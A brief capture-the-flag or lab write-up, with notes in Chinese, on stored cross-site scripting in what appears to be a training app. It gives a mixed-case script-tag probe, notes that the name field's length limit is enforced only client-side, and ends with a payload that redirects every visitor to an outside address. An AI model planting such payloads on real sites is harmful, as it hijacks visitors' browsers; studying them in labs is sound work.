# Stored Cross Site Scripting (XSS)

> Objective
Redirect everyone to a web page of your choosing.

### 觀察

```jsx
<sCript> alert(1) </sCript>
```
經過測試後你會發現第一個 name input 防護比較脆弱，有機可趁，但有限制長度，不過可以直接修改 input 長度，後端並沒有檢查

### Done

```jsx
<sCript>location.href="https://1.1.1.1"</sCript>
```
